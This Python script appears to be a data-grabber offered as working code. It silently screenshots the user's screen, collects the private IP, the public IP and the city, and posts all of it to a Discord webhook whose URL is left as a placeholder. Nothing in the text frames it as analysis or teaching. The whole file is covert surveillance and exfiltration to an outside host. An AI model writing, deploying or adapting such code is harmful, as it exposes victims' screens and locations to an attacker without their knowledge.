import requests
import pyautogui
import socket
import urllib.request

WEBHOOK_URL = "YOUR_WEBHOOK"

screenshot = pyautogui.screenshot()
screenshot.save("screen.png")


with open("screen.png", "rb") as f:
    requests.post(
        WEBHOOK_URL,
        files={"file": ("screen.png", f, "image/png")}
    )

def send_to_discord(text):
    data = {"content": text}
    requests.post(WEBHOOK_URL, json=data)

def get_private_ip():
    return socket.gethostbyname(socket.gethostname())

def get_public_ip():
    with urllib.request.urlopen("https://api.ipify.org") as response:
        return response.read().decode()

try:
    city = requests.get("https://ipinfo.io/json").json().get("city", ".")
    print("")
except Exception:
    print("")


private = get_private_ip()
public = get_public_ip()

send_to_discord(
    f"""```
Private ip:
{private}

Public ip:
{public}

City 🌍:
{city}

```"""
)





exit(5)

